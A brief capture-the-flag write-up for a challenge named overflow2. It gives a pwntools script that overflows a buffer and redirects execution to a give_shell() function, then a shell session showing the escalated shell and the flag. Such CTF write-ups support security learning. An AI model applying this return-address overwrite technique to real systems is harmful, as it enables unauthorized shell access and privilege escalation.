### Solved by superkojiman

Easy challenge. Just overflow the buffer in the vuln() function and return to give_shell():

```
#!/usr/bin/env python
from pwn import *

buf = ""
buf += "A"*28
buf += p32(0x80484dd)
open("in.txt", "w").write(buf)
```

Transfer in.txt over to the server and pass it as the argument to overflow2 to get a shell:

```
team24254@shell:/problems/overflow2$ ./overflow2 `cat ~/in.txt`
$ id
uid=1028(team24254) gid=1000(ctfgroup) euid=1078(overflow2) groups=1001(overflow2),1000(ctfgroup)
$ cat flag.txt
youre_lucky_i_left_that_function_for_you
$
```
